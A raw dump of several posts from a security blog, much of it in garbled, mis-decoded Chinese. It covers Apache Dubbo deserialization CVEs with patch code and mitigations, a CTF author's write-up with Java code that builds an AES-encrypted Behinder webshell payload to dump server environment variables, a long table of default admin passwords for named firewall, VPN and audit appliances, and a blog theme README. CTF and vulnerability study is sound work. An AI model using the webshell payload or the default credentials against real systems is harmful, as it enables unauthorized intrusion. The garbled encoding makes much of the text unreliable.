é€šè¿‡åœ¨å‘ç°ä»»ä½•æ— æ³•è¯†åˆ«çš„è¯·æ±‚æ—¶å¿«é€Ÿå¤±è´¥æ¥è§£å†³æ­¤é—®é¢˜ã€‚ https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/ serialization.security.check éœ€è¦è®¾ç½®ç¯å¢ƒå˜é‡å¯åŠ¨ System.setProperty(&quot;serialization.security.check&quot;, String.valueOf(true)); DecodeableRpcInvocation public Object decode(Channel channel, InputStream input) throws IOException &#123; ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input); this.put(&quot;serialization_id&quot;, this.serializationType); String dubboVersion = in.readUTF(); this.request.setVersion(dubboVersion); this.setAttachment(&quot;dubbo&quot;, dubboVersion); String path = in.readUTF(); this.setAttachment(&quot;path&quot;, path); String version = in.readUTF(); this.setAttachment(&quot;version&quot;, version); this.setMethodName(in.readUTF()); String desc = in.readUTF(); this.setParameterTypesDesc(desc); try &#123; if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123; CodecSupport.checkSerialization(path, version, this.serializationType); &#125; 2.7.12 ä¼ é€’ä¸€ä¸ªä¸å­˜åœ¨çš„åˆæ³•å‚æ•°ï¼Œè¿™å°†ä½¿è°ƒç”¨ç»“æŸä¸”ä¸ä¼šå¼•å‘å¼‚å¸¸ public static void checkSerialization(String path, String version, Byte id) throws IOException &#123; ServiceRepository repository = ApplicationModel.getServiceRepository(); ProviderModel providerModel = repository.lookupExportedServiceWithoutGroup(path + &quot;:&quot; + version); if (providerModel == null) &#123; if (logger.isWarnEnabled()) &#123; logger.warn(&quot;Serialization security check is enabled but cannot work as expected because there&#39;s no matched provider model for path &quot; + path + &quot;, version &quot; + version); &#125; &#125; else &#123; List&lt;URL&gt; urls = providerModel.getServiceConfig().getExportedUrls(); if (CollectionUtils.isNotEmpty(urls)) &#123; URL url = (URL)urls.get(0); String serializationName = url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;); Byte localId = (Byte)SERIALIZATIONNAME_ID_MAP.get(serializationName); if (localId != null &amp;&amp; !localId.equals(id)) &#123; throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;); &#125; &#125; &#125; &#125; 2.7.13è¡¥ä¸//logæ”¹æˆthrow Exception public static void checkSerialization(String path, String version, Byte id) throws IOException &#123; ServiceRepository repository = ApplicationModel.getServiceRepository(); ProviderModel providerModel = repository.lookupExportedServiceWithoutGroup(path + &quot;:&quot; + version); if (providerModel == null) &#123; throw new IOException(&quot;Service &quot; + path + &quot; with version &quot; + version + &quot; not found, invocation rejected.&quot;); &#125; else &#123; List&lt;URL&gt; urls = providerModel.getServiceConfig().getExportedUrls(); if (CollectionUtils.isNotEmpty(urls)) &#123; URL url = (URL)urls.get(0); String serializationName = url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;); Byte localId = (Byte)SERIALIZATIONNAME_ID_MAP.get(serializationName); if (localId != null &amp;&amp; !localId.equals(id)) &#123; throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;); &#125; &#125; &#125; &#125; è¿˜æ˜¯é»‘åå•å¥½ç”¨ï¼Œè¿‡æ»¤sinkä¸å¦‚è¿‡æ»¤source CVE-2021-43297https://www.cvedetails.com/cve/CVE-2021-43297/ https://cloud.tencent.com/developer/article/1945763 https://www.cnblogs.com/bitterz/p/15828415.html#5-dubbo2713%E5%8F%AF%E7%94%A8%E7%9A%84poc dubbo hessian-lite 3.2.11åŠä¹‹å‰ç‰ˆæœ¬å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¯èƒ½å¯¼è‡´æ¶æ„ä»£ç æ‰§è¡Œã€‚å¤§å¤šæ•° Dubbo ç”¨æˆ·ä½¿ç”¨ Hessian2 ä½œä¸ºé»˜è®¤çš„åºåˆ—åŒ–/ååºåˆ—åŒ–åè®®ï¼Œåœ¨ Hessian æ•è·æ„å¤–å¼‚å¸¸æœŸé—´ï¼ŒHessian ä¼šä¸ºç”¨æˆ·æ³¨é”€ä¸€äº›ä¿¡æ¯ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥é—®é¢˜å½±å“ Apache Dubbo Apache Dubbo 2.6.x 2.6.12 ä¹‹å‰çš„ç‰ˆæœ¬ï¼›Apache Dubbo 2.7.x 2.7.15 ä¹‹å‰çš„ç‰ˆæœ¬ï¼›Apache Dubbo 3.0.x 3.0.5 ä¹‹å‰çš„ç‰ˆæœ¬ã€‚ Apache Dubbo 2.6.x &lt; 2.6.12 Apache Dubbo 2.7.x &lt; 2.7.15 Apache Dubbo 3.0.x &lt; 3.0.5 AbstractDeserializerã€AbstractListDeserializerã€AbstractMapDeserializer com.alibaba.com.caucho.hessian.io.AbstractMapDeserializer public Object readObject(AbstractHessianInput in) throws IOException &#123; Object obj = in.readObject(); if (obj != null) &#123; throw this.error(&quot;expected map/object at &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;); &#125; else &#123; throw this.error(&quot;expected map/object at null&quot;); &#125; &#125; 2.7.13æ²¡æœ‰é»‘åå• 2.7.14éœ€è¦ç»•è¿‡é»‘åå• 2.7.15ä¿®å¤sink2 https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd protected IOException expect(String expect, int ch) throws IOException &#123; if (ch &lt; 0) &#123; return this.error(&quot;expected &quot; + expect + &quot; at end of file&quot;); &#125; else &#123; --this._offset; try &#123; Object obj = this.readObject(); return obj != null ? this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; &quot; + obj.getClass().getName()) : this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; null&quot;); å…¶ä»–æ¼æ´https://www.cvedetails.com/cve/CVE-2021-30180/ https://www.cvedetails.com/cve/CVE-2021-30181/ é—®é¢˜è§£å†³trick: æ–­ç‚¹ä¸‹åœ¨jndi [Dubbo] Current Spring Boot Application is await &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; https://blog.csdn.net/qq_33189961/article/details/116430262 dubbo 2.7.5 //2.7.6æ²¡æœ‰é—®é¢˜ nc 127.0.0.1 12345 dubbo&gt;ls æŠ¥é”™ Unsupported command: ls æ”¹provideçš„application.propertierï¼Œå¹¶å®‰è£…æ’ä»¶ https://github.com/apache/dubbo/issues/5690 dubbopoc ä¾èµ–ä¸ºdubbo-2.7.13æ—¶å¯åŠ¨ provide æŠ¥é”™: Error creating bean with name â€˜referenceAnnotationBeanPostProcessorâ€™ https://www.editcode.net/thread-79209-1-1.html &lt;dependency&gt; &lt;groupId&gt;com.alibaba.spring&lt;/groupId&gt; &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt; &lt;version&gt;1.0.11&lt;/version&gt; &lt;/dependency&gt; é˜²æŠ¤1ã€å…³é—­å¯¹å…¬ç½‘å¼€æ”¾çš„DubboæœåŠ¡ç«¯ç«¯å£ï¼Œä»…å…è®¸å¯ä¿¡ä»»çš„IPè®¿é—®ã€‚ 2ã€Dubboåè®®é»˜è®¤ä½¿ç”¨Hessianè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚åœ¨ä¸å½±å“ä¸šåŠ¡çš„æƒ…å†µä¸‹ï¼Œå»ºè®®æ›´æ¢åè®®ä»¥åŠååºåˆ—åŒ–æ–¹å¼ã€‚å…·ä½“æ–¹æ³•è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼šhttp://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html 3ã€é…ç½®ç¯å¢ƒå˜é‡serialization.security.check=trueï¼Œå¼€å¯å¼ºæ ¡éªŒ","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"RCTF2021_misc_ezshell_å‡ºé¢˜äººwp","slug":"RCTF2021_misc_ezshell_å‡ºé¢˜äººwp","date":"2021-09-14T14:08:27.739Z","updated":"2022-03-20T16:40:16.844Z","comments":true,"path":"2021/09/14/RCTF2021_misc_ezshell_å‡ºé¢˜äººwp/","link":"","permalink":"https://pipimi110.github.io/2021/09/14/RCTF2021_misc_ezshell_%E5%87%BA%E9%A2%98%E4%BA%BAwp/","excerpt":"","text":"docker https://github.com/pipimi110/myctf/tree/main/misc/rctf2021_ezshell é¢„æœŸè§£http://124.70.137.88:60080/xxx tomcat 404æŠ¥é”™ /index.html è·³è½¬ /shell å¯ä»¥ç›´æ¥ä¸‹è½½ ROOT.war å‘ç°æœ‰ä¸ªæ ¹æ®å†°è shell.jsp å®ç°çš„ servlet shellï¼Œæ ¹æ®é¢˜ç›®æè¿°ï¼Œè¿‡æ»¤äº†å†…å­˜é©¬ã€å‘½ä»¤æ‰§è¡Œï¼Œä¸”é™åˆ¶å‡ºç½‘ï¼Œæ‰€ä»¥è€ƒè™‘å®ç°å›æ˜¾ æ ¹æ®æç¤ºï¼ŒæŸ¥çœ‹å†°è BasicInfo æºç ï¼Œå‘ç°å…¶åŠŸèƒ½ä¸ºè¾“å‡ºç¯å¢ƒå˜é‡å’Œç³»ç»Ÿå±æ€§ï¼ŒExp å°è¯•ç›´æ¥è¾“å‡ºç¯å¢ƒå˜é‡å°±çœ‹åˆ° flag äº† è¡¥å…… å…¶å®è¿™é“é¢˜ä¸»è¦æ–¹å‘æ˜¯å†°èå¯†é’¥äº¤äº’å†™æ­» getOutputStream å’Œé¢˜ç›® Servlet é‡Œçš„ getWriter å†²çª å¦‚æœæœ‰çš„å¸ˆå‚…æ‰‹ä¸Šæœ‰ä¿®æ”¹åæ”¯æŒè¿æ¥å†…å­˜é©¬çš„å†°èï¼Œä¿®æ”¹å¯¹åº”å‡½æ•°åä¸º Servlet ä¸­çš„ â€˜eâ€™ åï¼Œåº”è¯¥ä¹Ÿæ˜¯è¿ä¸ä¸Šçš„: ) payload/java/Echo Object so = this.Response.getClass().getMethod(&quot;getOutputStream&quot;).invoke(this.Response); æ”¯æŒå†…å­˜é©¬è¿æ¥å’Œå‡½æ•°å†²çªè§£å†³çš„å†°èçš„ä¸€ä¸ªdemo https://github.com/pipimi110/Behinder_ezshell ezshellä¸­ä½¿ç”¨çš„agent https://github.com/pipimi110/javaAgentLearn Expected solutionhttp://124.70.137.88:60080/xxx tomcat 404 error /index.html jump to /shell to download ROOT.war found a servlet shell based on shell.jsp of the Behinder ,according to the desc, There is an agent to filter memshell and ProcessImpl, and The Outbound traffic is closed, so just Echo According to the hint, read the source code of the Behinder BasicInfo, and find that its function is to output environment variables and system properties, then try to directly output environment variables and see flag :) Additions In fact, the main direction of this question is the conflict between the getOutputStream used in the Behinder key interaction and the getWriter in the Servlet If some ctfers have a modified Behinder that supports connecting to memshell, they should not be able to connect even after modifying the corresponding function name to â€˜eâ€™ in the Servlet: ) payload/java/Echo Object so = this.Response.getClass().getMethod(&quot;getOutputStream&quot;).invoke(this.Response); A demo of Behinder that supports memshell connection and function conflict resolution https://github.com/pipimi110/Behinder_ezshell Agent used in ezshell https://github.com/pipimi110/javaAgentLearn Expimport javassist.ClassPool; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletResponse; import java.io.InputStream; import java.net.URL; import java.net.URLConnection; import java.util.*; public class demo &#123; public boolean e(Object obj1, Object obj2) &#123; solve((HttpServletResponse) obj2); return false; &#125; public void solve(HttpServletResponse obj2) &#123; try &#123; obj2.getWriter().write(&quot;demo success&quot;); obj2.getWriter().write(getSysEnv()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) throws Exception &#123; // getSysEnv(); getpayload(); &#125; public static String getSysEnv() throws Exception &#123; StringBuilder basicInfo = new StringBuilder(&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;ç¯å¢ƒå˜é‡:&lt;/font&gt;&lt;br/&gt;&quot;); Map&lt;String, String&gt; env = System.getenv(); Iterator var5 = env.keySet().iterator(); while (var5.hasNext()) &#123; String name = (String) var5.next(); basicInfo.append(name + &quot;=&quot; + (String) env.get(name) + &quot;&lt;br/&gt;&quot;); &#125; return (basicInfo.toString()); &#125; public static void getpayload() throws Exception &#123; String k = &quot;e45e329feb5d925b&quot;;/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/ Cipher c = Cipher.getInstance(&quot;AES&quot;); c.init(1, new SecretKeySpec(k.getBytes(), &quot;AES&quot;)); byte[] bytes = ClassPool.getDefault().get(&quot;demo&quot;).toBytecode(); bytes = c.doFinal(bytes); System.out.println(new String(Base64.getEncoder().encode(bytes))); &#125; &#125; class U extends ClassLoader &#123; U(ClassLoader c) &#123; super(c); &#125; public Class g(byte[] b) &#123; return super.defineClass(b, 0, b.length); &#125; &#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pipimi110.github.io/categories/CTF/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"https://pipimi110.github.io/categories/CTF/"}]},{"title":"ayaneSama","slug":"ayaneSama","date":"2021-04-19T09:11:51.335Z","updated":"2022-03-20T16:39:33.187Z","comments":true,"path":"2021/04/19/ayaneSama/","link":"","permalink":"https://pipimi110.github.io/2021/04/19/ayaneSama/","excerpt":"","text":"o((&gt;Ï‰&lt; ))o","categories":[{"name":"test","slug":"test","permalink":"https://pipimi110.github.io/categories/test/"}],"tags":[{"name":"cv","slug":"cv","permalink":"https://pipimi110.github.io/tags/cv/"}],"keywords":[{"name":"test","slug":"test","permalink":"https://pipimi110.github.io/categories/test/"}]},{"title":"å¯†ç è¡¨","slug":"å¯†ç è¡¨","date":"2021-04-18T18:41:20.376Z","updated":"2022-03-20T16:41:12.004Z","comments":true,"path":"2021/04/19/å¯†ç è¡¨/","link":"","permalink":"https://pipimi110.github.io/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/","excerpt":"","text":"å¯†ç è¡¨æœåŠ¡åŸå§‹å¯†ç https://www.it2021.com/security/614.html è®¾å¤‡é»˜è®¤è´¦å·é»˜è®¤å¯†ç æ·±ä¿¡æœäº§å“sangforsangforsangfor@2018sangfor@2019æ·±ä¿¡æœç§‘æŠ€ ADdlanrecoveræ·±ä¿¡æœè´Ÿè½½å‡è¡¡ AD 3.6adminadminæ·±ä¿¡æœWAC ( WNS V2.6)adminadminæ·±ä¿¡æœVPNAdminAdminæ·±ä¿¡æœipsec-VPN (SSL 5.5)AdminAdminæ·±ä¿¡æœAC6.0adminadminSANGFORé˜²ç«å¢™adminsangforæ·±ä¿¡æœAF(NGAF V2.2)adminsangforæ·±ä¿¡æœNGAFä¸‹ä¸€ä»£åº”ç”¨é˜²ç«å¢™(NGAF V4.3)adminadminæ·±ä¿¡æœAD3.9adminadminæ·±ä¿¡æœä¸Šç½‘è¡Œä¸ºç®¡ç†è®¾å¤‡æ•°æ®ä¸­å¿ƒAdminå¯†ç ä¸ºç©ºSANGFOR_AD_v5.1adminadminç½‘å¾¡æ¼æ´æ‰«æç³»ç»Ÿleadsecleadsecå¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V7.0Adminvenus70Auditvenus70admvenus70å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V6.0Adminvenus60Auditvenus60admvenus60ç½‘å¾¡WAFé›†ä¸­æ§åˆ¶ä¸­å¿ƒ(V3.0R5.0)adminleadsec.wafauditleadsec.wafadmleadsec.wafè”æƒ³ç½‘å¾¡administratoradministratorç½‘å¾¡äº‹ä»¶æœåŠ¡å™¨adminadmin123è”æƒ³ç½‘å¾¡é˜²ç«å¢™PowerVadministratoradministratorè”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿlenovodefaultç½‘ç»œå«å£«å…¥ä¾µæ£€æµ‹ç³»ç»Ÿadmintalentç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸV3.2.72.0admleadsec32adminleadsec32è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸIDSroot111111adminadmin123ç§‘æ¥ç½‘ç»œå›æº¯åˆ†æç³»ç»Ÿcsadmincolasoftä¸­æ§è€ƒå‹¤æœºweb3.0administrator123456H3C iMCadminadminH3C SecPathç³»åˆ—adminadminH3C S5120-SItest123H3Cæ™ºèƒ½ç®¡ç†ä¸­å¿ƒadminadminH3C ER3100adminadminer3100H3C ER3200adminadminer3200H3C ER3260adminadminer3260H3Cadminadmineradminadminadminh3capadminh3ch3c360å¤©æ“adminadminç½‘ç¥é˜²ç«å¢™firewallfirewallå¤©èä¿¡é˜²ç«å¢™NGFW4000supermantalenté»‘ç›¾é˜²ç«å¢™adminadminruleabc123auditabc123åä¸ºé˜²ç«å¢™telnetusertelnetpwdftpuserftppwdæ–¹æ­£é˜²ç«å¢™adminadminé£å¡”é˜²ç«å¢™adminå¯†ç ä¸ºç©ºJuniper_SSG__5é˜²ç«å¢™netscreennetscreenä¸­æ–°é‡‘ç›¾ç¡¬ä»¶é˜²ç«å¢™admin123killé˜²ç«å¢™(å† ç¾¤é‡‘è¾°)adminsys123å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™adminvenus.fwAuditvenus.audituseradminvenus.useré˜¿å§†ç‘ç‰¹é˜²ç«å¢™adminmanagerå±±çŸ³ç½‘ç§‘hillstonehillstoneç»¿ç›Ÿå®‰å…¨å®¡è®¡ç³»ç»Ÿweboperweboperwebauditwebauditconadminconadminadminadminshellshellç»¿ç›Ÿäº§å“nsfocus123TopAuditæ—¥å¿—å®¡è®¡ç³»ç»ŸsupermantalentLogBaseæ—¥å¿—ç®¡ç†ç»¼åˆå®¡è®¡ç³»ç»Ÿadminsafetybaseç½‘ç¥SecFoxè¿ç»´å®‰å…¨ç®¡ç†ä¸å®¡è®¡ç³»ç»Ÿadmin!1fw@2soc#3vpnå¤©èä¿¡æ•°æ®åº“å®¡è®¡ç³»ç»ŸsupermantelentHillstoneå®‰å…¨å®¡è®¡å¹³å°hillstonehillstoneç½‘åº·æ—¥å¿—ä¸­å¿ƒns25000ns25000ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿï¼ˆä¸­ç§‘æ–°ä¸šï¼‰admin123456å¤©ç¥ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»ŸAdmincyberauditæ˜å¾¡WEBåº”ç”¨é˜²ç«å¢™adminadminadminadminadminæ˜å¾¡æ”»é˜²å®éªŒå®¤å¹³å°root123456æ˜å¾¡å®‰å…¨ç½‘å…³adminadminadminæ˜å¾¡è¿ç»´å®¡è®¡ä¸å†Œé£é™©æ§åˆ¶ç³»ç»Ÿadmin1q2w3esystem1q2w3e4rauditor1q2w3e4roperator1q2w3e4ræ˜å¾¡ç½‘ç«™å«å£«sysmanagersysmanager888äº¿é‚®é‚®ä»¶ç½‘å…³eyouusereyou_admineyougwadmin@(eyou)admin+-cccccadmincyouadminWebsenseé‚®ä»¶å®‰å…¨ç½‘å…³administratoradminæ¢­å­é±¼é‚®ä»¶å­˜å‚¨ç½‘å…³adminadmin","categories":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}],"tags":[{"name":"txt","slug":"txt","permalink":"https://pipimi110.github.io/tags/txt/"}],"keywords":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}]},{"title":"Hexo-Theme-Sakura","slug":"Hexo-Theme-Sakura","date":"2018-12-12T14:16:01.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"2018/12/12/Hexo-Theme-Sakura/","link":"","permalink":"https://pipimi110.github.io/2018/12/12/Hexo-Theme-Sakura/","excerpt":"","text":"hexo-theme-sakuraä¸»é¢˜ English document åŸºäºWordPressä¸»é¢˜Sakuraä¿®æ”¹æˆHexoçš„ä¸»é¢˜ã€‚ demoé¢„è§ˆ æ­£åœ¨å¼€å‘ä¸­â€¦â€¦ äº¤æµç¾¤è‹¥ä½ æ˜¯ä½¿ç”¨è€…ï¼ŒåŠ ç¾¤QQ: 801511924 è‹¥ä½ æ˜¯åˆ›ä½œè€…ï¼ŒåŠ ç¾¤QQ: 194472590 ä¸»é¢˜ç‰¹æ€§ é¦–é¡µå¤§å±è§†é¢‘ é¦–é¡µéšæœºå°é¢ å›¾ç‰‡æ‡’åŠ è½½ valineè¯„è®º fancy-boxç›¸å†Œ pjaxæ”¯æŒï¼ŒéŸ³ä¹ä¸é—´æ–­ aplayeréŸ³ä¹æ’­æ”¾å™¨ å¤šçº§å¯¼èˆªèœå•ï¼ˆæŒ‰ç°åœ¨å¤§éƒ¨åˆ†hexoä¸»é¢˜æ¥è¯´ï¼Œè¿™ä¹Ÿç®—æ˜¯ä¸ªç‰¹æ€§äº†ï¼‰ èµèµä½œè€…å¦‚æœå–œæ¬¢hexo-theme-sakuraä¸»é¢˜ï¼Œå¯ä»¥è€ƒè™‘èµ„åŠ©ä¸€ä¸‹å“¦~éå¸¸æ„Ÿæ¿€ï¼ paypal | Alipay æ”¯ä»˜å® | WeChat Pay å¾®ä¿¡æ”¯ä»˜ æœªå®Œå–„çš„ä½¿ç”¨æ•™ç¨‹é‚£å•¥ï¼Ÿè€å®è¯´æˆ‘ç›®å‰ä¹Ÿä¸æ˜¯å¾ˆæœ‰æ¡ç†233333333~ 1ã€ä¸»é¢˜ä¸‹è½½å®‰è£…hexo-theme-sakuraå»ºè®®ä¸‹è½½å‹ç¼©åŒ…æ ¼å¼ï¼Œå› ä¸ºé™¤äº†ä¸»é¢˜å†…å®¹è¿˜æœ‰äº›sourceçš„é…ç½®å¯¹æ–°æ‰‹æ¥è¯´æ¯”è¾ƒå¤ªéº»çƒ¦ï¼Œç›´æ¥ä¸‹è½½è§£å‹å°±çœå»è¿™äº›éº»çƒ¦å’¯ã€‚ ä¸‹è½½å¥½åè§£å‹åˆ°åšå®¢æ ¹ç›®å½•ï¼ˆä¸æ˜¯ä¸»é¢˜ç›®å½•å“¦ï¼Œé‡å¤çš„é€‰æ‹©æ›¿æ¢ï¼‰ã€‚æ¥ç€åœ¨å‘½ä»¤è¡Œï¼ˆcmdã€bashï¼‰è¿è¡Œnpm iå®‰è£…ä¾èµ–ã€‚ 2ã€ä¸»é¢˜é…ç½®åšå®¢æ ¹ç›®å½•ä¸‹çš„_configé…ç½®ç«™ç‚¹ # Site title: ä½ çš„ç«™ç‚¹å subtitle: description: ç«™ç‚¹ç®€ä»‹ keywords: author: ä½œè€…å language: zh-cn timezone: éƒ¨ç½² deploy: type: git repo: github: ä½ çš„githubä»“åº“åœ°å€ # coding: ä½ çš„codingä»“åº“åœ°å€ branch: master å¤‡ä»½ ï¼ˆä½¿ç”¨hexo bå‘å¸ƒå¤‡ä»½åˆ°è¿œç¨‹ä»“åº“ï¼‰ backup: type: git message: backup my blog of https://honjun.github.io/ repository: # ä½ çš„githubä»“åº“åœ°å€,å¤‡ä»½åˆ†æ”¯å ï¼ˆå»ºè®®æ–°å»ºbackupåˆ†æ”¯ï¼‰ github: https://github.com/honjun/honjun.github.io.git,backup # coding: https://git.coding.net/hojun/hojun.git,backup ä¸»é¢˜ç›®å½•ä¸‹çš„_configé…ç½®å…¶ä¸­æ ‡æ˜ã€æ”¹ã€‘çš„æ˜¯éœ€è¦ä¿®æ”¹éƒ¨é—¨ï¼Œæ ‡æ˜ã€é€‰ã€‘æ˜¯å¯æ”¹å¯ä¸æ”¹ï¼Œæ ‡æ˜ã€éã€‘æ˜¯ä¸ç”¨æ”¹çš„éƒ¨åˆ† # site name # ç«™ç‚¹å ã€æ”¹ã€‘ prefixName: ã•ãã‚‰è˜ãã® siteName: hojun # favicon and site master avatar # ç«™ç‚¹çš„faviconå’Œå¤´åƒ è¾“å…¥å›¾ç‰‡è·¯å¾„ï¼ˆä¸‹é¢çš„é…ç½®æ˜¯éƒ½æ˜¯cdnçš„ç›¸å¯¹è·¯å¾„ï¼Œæ²¡æœ‰cdnè¯·å¡«å†™å®Œæ•´è·¯å¾„ï¼Œå»ºè®®ä½¿ç”¨jsdeliveræ­å»ºä¸€ä¸ªcdnå•¦ï¼Œå…ˆå»ä¸‹è½½æˆ‘çš„cdnæ›¿æ¢ä¸‹å›¾ç‰‡å°±è¡Œäº†ï¼Œç®€å•æ–¹ä¾¿~ï¼‰ã€æ”¹ã€‘ favicon: /images/favicon.ico avatar: /img/custom/avatar.jpg # ç«™ç‚¹url ã€æ”¹ã€‘ url: https://sakura.hojun.cn # ç«™ç‚¹ä»‹ç»ï¼ˆæˆ–è€…è¯´æ˜¯ä¸ªäººç­¾åï¼‰ã€æ”¹ã€‘ description: Live your life with passion! With some drive! # ç«™ç‚¹cdnï¼Œæ²¡æœ‰å°±ä¸ºç©º ã€æ”¹ã€‘ è‹¥æ˜¯cdnä¸ºç©ºï¼Œä¸€äº›å›¾ç‰‡åœ°å€å°±è¦å¡«å®Œæ•´åœ°å€äº†ï¼Œæ¯”å¦‚ä¹‹å‰avatarå°±è¦å¡«https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/avatar.jpg cdn: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6 # å¼€å¯pjax ã€é€‰ã€‘ pjax: 1 # ç«™ç‚¹é¦–é¡µçš„å…¬å‘Šä¿¡æ¯ ã€æ”¹ã€‘ notice: hexo-Sakuraä¸»é¢˜å·²ç»å¼€æºï¼Œç›®å‰æ­£åœ¨å¼€å‘ä¸­... # æ‡’åŠ è½½çš„åŠ è½½ä¸­å›¾ç‰‡ ã€é€‰ã€‘ lazyloadImg: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg # ç«™ç‚¹èœå•é…ç½® ã€é€‰ã€‘ menus: é¦–é¡µ: &#123; path: /, fa: fa-fort-awesome faa-shake &#125; å½’æ¡£: &#123; path: /archives, fa: fa-archive faa-shake, submenus: &#123; æŠ€æœ¯: &#123;path: /categories/æŠ€æœ¯/, fa: fa-code &#125;, ç”Ÿæ´»: &#123;path: /categories/ç”Ÿæ´»/, fa: fa-file-text-o &#125;, èµ„æº: &#123;path: /categories/èµ„æº/, fa: fa-cloud-download &#125;, éšæƒ³: &#123;path: /categories/éšæƒ³/, fa: fa-commenting-o &#125;, è½¬è½½: &#123;path: /categories/è½¬è½½/, fa: fa-book &#125; &#125; &#125; æ¸…å•: &#123; path: javascript:;, fa: fa-list-ul faa-vertical, submenus: &#123; ä¹¦å•: &#123;path: /tags/æ‚¦è¯»/, fa: fa-th-list faa-bounce &#125;, ç•ªç»„: &#123;path: /bangumi/, fa: fa-film faa-vertical &#125;, æ­Œå•: &#123;path: /music/, fa: fa-headphones &#125;, å›¾é›†: &#123;path: /tags/å›¾é›†/, fa: fa-photo &#125; &#125; &#125; ç•™è¨€æ¿: &#123; path: /comment/, fa: fa-pencil-square-o faa-tada &#125; å‹äººå¸: &#123; path: /links/, fa: fa-link faa-shake &#125; èµèµ: &#123; path: /donate/, fa: fa-heart faa-pulse &#125; å…³äº: &#123; path: /, fa: fa-leaf faa-wrench , submenus: &#123; æˆ‘ï¼Ÿ: &#123;path: /about/, fa: fa-meetup&#125;, ä¸»é¢˜: &#123;path: /theme-sakura/, fa: iconfont icon-sakura &#125;, Lab: &#123;path: /lab/, fa: fa-cogs &#125;, &#125; &#125; å®¢æˆ·ç«¯: &#123; path: /client/, fa: fa-android faa-vertical &#125; RSS: &#123; path: /atom.xml, fa: fa-rss faa-pulse &#125; # Home page sort type: -1: newer firstï¼Œ1: older first. ã€éã€‘ homePageSortType: -1 # Home page article shown number) ã€éã€‘ homeArticleShown: 10 # èƒŒæ™¯å›¾ç‰‡ ã€é€‰ã€‘ bgn: 8 # startdashé¢æ¿ url, title, desc img ã€æ”¹ã€‘ startdash: - &#123;url: /theme-sakura/, title: Sakura, desc: æœ¬ç«™ hexo ä¸»é¢˜, img: /img/startdash/sakura.md.png&#125; - &#123;url: http://space.bilibili.com/271849279, title: Bilibili, desc: åšä¸»çš„bç«™è§†é¢‘, img: /img/startdash/bilibili.jpg&#125; - &#123;url: /, title: hojunçš„ä¸‡äº‹å±‹, desc: æŠ€æœ¯æœåŠ¡, img: /img/startdash/wangshiwu.jpg&#125; # your site build time or founded date # ä½ çš„ç«™ç‚¹å»ºç«‹æ—¥æœŸ ã€æ”¹ã€‘ siteBuildingTime: 07/17/2018 # ç¤¾äº¤æŒ‰é’®(social) url, img PCç«¯é…ç½® ã€æ”¹ã€‘ social: github: &#123;url: http://github.com/honjun, img: /img/social/github.png&#125; sina: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/sina.png&#125; wangyiyun: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/wangyiyun.png&#125; zhihu: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/zhihu.png&#125; email: 